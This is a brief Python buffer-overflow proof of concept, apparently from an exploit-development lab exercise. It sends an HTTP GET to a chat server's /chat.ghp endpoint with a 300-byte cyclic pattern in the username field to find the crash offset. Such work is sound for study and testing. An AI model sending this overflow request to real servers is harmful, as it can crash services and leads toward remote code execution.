#!/usr/bin/python
# -*- coding: UTF-8 -*-
# Autor: 1º Ten Chitolina - 0x4rt3mis

import sys
import socket
from struct import pack

host = '192.168.122.49'
port = 80

# Payload de 300
payload = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9"

# Nao alterar
buffer = b"GET /chat.ghp?username=" + payload + b"&password=&room=1&sex=1 HTTP/1.1\r\n"
buffer += b"User-Agent: Mozilla/4.0\r\n"
buffer += b"Host: 192.168.122.49:80\r\n"
buffer += b"Accept-Language: en-us\r\n"
buffer += b"Accept-Encoding: gzip, deflate\r\n"
buffer += b"Referer: http://192.168.122.49\r\n"
buffer += b"Connection: Keep-Alive\r\n\r\n"

print("[*] Sending evil buffer...")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.send(buffer)
s.close()
print("[+] Done!")